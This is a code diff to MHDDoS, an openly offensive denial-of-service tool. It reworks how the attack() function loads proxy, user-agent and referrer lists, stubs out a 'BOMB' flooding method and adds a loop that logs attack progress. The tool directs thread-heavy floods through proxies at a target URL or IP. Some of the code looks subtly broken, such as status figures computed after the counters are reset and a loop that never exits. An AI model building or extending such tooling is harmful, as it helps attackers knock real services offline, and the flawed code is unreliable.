@@ -21,11 +21,12 @@ from MHDDoS.methods.layer_4 import Layer4
 from MHDDoS.methods.layer_7 import Layer7
 from MHDDoS.methods.methods import Methods
 from MHDDoS.methods.tools import Tools
+from MHDDoS.utils.config_files import read_configuration_file_lines
 from MHDDoS.utils.console_utils import clear_lines_from_console
 from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
 from MHDDoS.utils.logs import craft_outreach_log_message
 from MHDDoS.utils.misc import Counter
-from MHDDoS.utils.proxies import ProxyManager
+from MHDDoS.utils.proxies import ProxyManager, load_proxies
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -53,83 +54,21 @@ def exit(*message):
 #     pass
 
 
-def read_configuration_file_text(file_path_or_url: str) -> str | None:
-    """
-    Loads text content from the given file or URL.
-    If given URL, will read text from it and return it.
-    If given a relative path, will return the contents of the file at this path.
-        If the file doesn't exist relative to workdir, will look for this file in default MHDDoS/files folder.
-    If the file could not be located/read, will return None.
-
-    Args:
-        file_path_or_url: Absolute path, relative path or URL of the file.
-
-    Returns:
-        Text content of the file if it was located, None otherwise.
-    """
-    # if URL, load with a request
-    if validators.url(file_path_or_url):
-        response = requests.get(file_path_or_url, timeout=10)
-        return response.text
-
-    # if not URL, try to look locally
-    path = Path(file_path_or_url)
-    if path.is_file():
-        return path.read_text()
-    elif not path.is_absolute():
-        # if not found relative to the workdir, look relative to 'MHDDoS/files'
-        path = Path(__dir__ / "files/" / path)
-        if path.is_file():
-            return path.read_text()
-
-    return None
-
-
-def load_proxies(proxies_file_path: str, proxy_type: ProxyType = ProxyType.SOCKS5) -> List[Proxy]:
-    if validators.url(proxies_file_path):
-        # TODO: download file if it's a URL
-        pass
-
-    # look for this file in
-    proxy_path_relative = proxies_file_path
-    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
-    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
-        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-
-    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
-    proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)
-
-
-def load_user_agents(user_agents_file_path: str) -> List[str]:
-    if validators.url(proxies_file_path):
-        # TODO: download file if it's a URL
-        pass
-
-    # look for this file in
-
-    # look for this file in default MHDDoS folder
-    useragent_file_path = Path(__dir__ / "files/useragent.txt")
-    if not useragent_file_path.exists():
-        exit("The Useragent file doesn't exist ")
-    uagents = set(a.strip()
-                  for a in useragent_file_path.open("r+").readlines())
-    if not uagents:
-        exit("Empty Useragent File ")
-
-
 def attack(
     attack_method: str,
     target_address: str,  # URL or IP
     target_port: int,
-    proxies_file_path: str,
-    user_agents_file_path: str,
-    referrers_file_path: str
+    proxy_type: ProxyType = ProxyType.SOCKS5,
+    proxies_file_path: str = "proxies/socks5.txt",
+    user_agents_file_path: str = "user_agents.txt",
+    referrers_file_path: str = "referrers.txt"
 ):
     attack_threads: List[Thread] = []
 
-    proxies_config = []  # TODO: we WILL load proxies here
-    with open(__dir__ / "config.json") as f:
-        proxies_config = load(f)
+    # LOAD CONFIG FILES
+    user_agents = read_configuration_file_lines(user_agents_file_path)
+    referrers = read_configuration_file_lines(referrers_file_path)
+    proxies = load_proxies(proxies_file_path, proxy_type)
 
     # SANITY CHECKS
     # check attack method
@@ -144,7 +83,18 @@ def attack(
     if not is_ip and not is_url:
         exit(f"Provided target address ('{target_address}') is neither a valid IPv4 nor a URL. Please provide a valid target address next time.")
 
-    # counters
+    # HANDLE BOMBARDIER
+    if attack_method == "BOMB":
+        raise NotImplemented("'BOMB' method support is not implemented yet.")
+        # TODO: (maybe) add support for BOMBARDIER
+        global bombardier_path
+        bombardier_path = Path(__dir__ / "go/bin/bombardier")
+        assert (
+                bombardier_path.exists()
+                or bombardier_path.with_suffix('.exe').exists()
+        ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
+
+    # INITIALIZE COUNTERS
     REQUESTS_SENT = Counter()
     BYTES_SENT = Counter()
     TOTAL_REQUESTS_SENT = Counter()
@@ -166,43 +116,8 @@ def attack(
         rpc = int(argv[6])
         timer = int(argv[7])
 
-        # HANDLE PROXIES
-        proxy_type = int(argv[3].strip())
-        proxy_path_relative = argv[5].strip()
-        proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
-        if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
-            proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-
-        proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
-        proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)
-
-        # HANDLE BOMBARDIER
-        global bombardier_path
-        bombardier_path = Path(__dir__ / "go/bin/bombardier")
-        if attack_method == "BOMB":
-            assert (
-                    bombardier_path.exists()
-                    or bombardier_path.with_suffix('.exe').exists()
-            ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
-
         if len(argv) == 9:
             logger.setLevel("DEBUG")
-
-        # HANDLE USERAGENTS
-        useragent_file_path = Path(__dir__ / "files/useragent.txt")
-        if not useragent_file_path.exists():
-            exit("The Useragent file doesn't exist ")
-        uagents = set(a.strip()
-                      for a in useragent_file_path.open("r+").readlines())
-        if not uagents: exit("Empty Useragent File ")
-
-        # HANDLE REFERRERS
-        referrers_file_path = Path(__dir__ / "files/referers.txt")
-        if not referrers_file_path.exists():
-            exit("The Referer file doesn't exist ")
-        referers = set(a.strip()
-                       for a in referrers_file_path.open("r+").readlines())
-        if not referers: exit("Empty Referer File ")
 
         if threads > 1000:
             logger.warning("Number of threads is higher than 1000")
@@ -278,7 +193,30 @@ def attack(
     #       - check CPU utilization
     #       - decrease/increase threads
     #       - each thread gets it's own proxy?
-    pass
+    logger.info(f"Attack started at {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
+    event.set()
+    ts = time()
+
+    while True:
+        # log_attack_status()
+
+        # update request counts
+        TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
+        TOTAL_BYTES_SENT += int(BYTES_SENT)
+        REQUESTS_SENT.set(0)
+        BYTES_SENT.set(0)
+
+        # craft the status log message
+        pps = Tools.humanformat(int(REQUESTS_SENT))
+        bps = Tools.humanbytes(int(BYTES_SENT))
+        tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
+        tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
+        logger.info(f"Total bytes sent: {tb}, total requests: {tp}")
+
+        sleep(1)
+
+    event.clear()
+    exit()
 
 
 def start():
